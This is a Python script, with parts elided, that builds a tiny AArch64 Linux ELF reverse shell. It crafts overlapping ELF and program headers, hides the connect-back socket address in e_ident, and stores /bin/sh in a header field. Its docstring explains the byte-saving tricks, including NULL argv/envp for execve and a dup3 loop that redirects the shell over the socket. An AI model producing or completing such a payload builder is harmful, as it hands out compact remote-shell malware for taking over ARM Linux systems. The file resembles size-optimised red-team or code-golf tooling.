#!/usr/bin/env python3
"""
Downsized AArch64 Reverse Shell ELF (~196 bytes).
Header overlap: e_phoff=0x3C (116-byte combined header).
Sockaddr in e_ident[8:16], /bin/sh in e_shoff (clobberable fields).
execve with argv=NULL, envp=NULL (saves stp+mov, 8 bytes).
dup3 loop: mov x2,xzr once (kernel preserves x2 through svc), cbnz for branch.
"""
...
def build_elf(raw_code):
    ...
    # 116-byte combined ELF+PHDR header
    h = bytearray(TOTAL_HEADER_SIZE)
    h[0:4] = b'\x7fELF'
    h[4]=2; h[5]=1; h[6]=1; h[7]=0
    struct.pack_into('<Q', h, 0x08, SOCKADDR_VAL)           # e_ident[8:16]
    ...
    # PHDR at 0x3C (p_type overlaps e_shnum/e_shstrndx)
    ...
    struct.pack_into('<Q', h, 0x6C, 1)       # p_align=1
